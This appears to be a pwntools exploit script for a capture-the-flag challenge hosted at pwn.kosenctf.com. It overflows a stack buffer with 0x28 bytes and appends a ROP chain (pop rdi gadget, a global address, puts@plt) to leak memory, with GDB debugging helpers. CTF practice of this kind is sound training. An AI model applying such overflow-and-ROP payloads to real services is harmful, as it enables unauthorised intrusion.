import tty
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = 'pwn.kosenctf.com'
PORT = 9002

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdin=PTY, raw=False)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0xa44,0x9ce])

rdi = 0x00400b03

username = 0x6020c0
password = 0x6020e0

payload = 'A'*0x28+flat(rdi,username,elf.plt.puts)[:-1]
# payload = 'A'*0x28+flat(rdi,password,elf.plt.puts)[:-1]
r.sendafter(': ', payload)
r.shutdown()

r.interactive()
r.close()
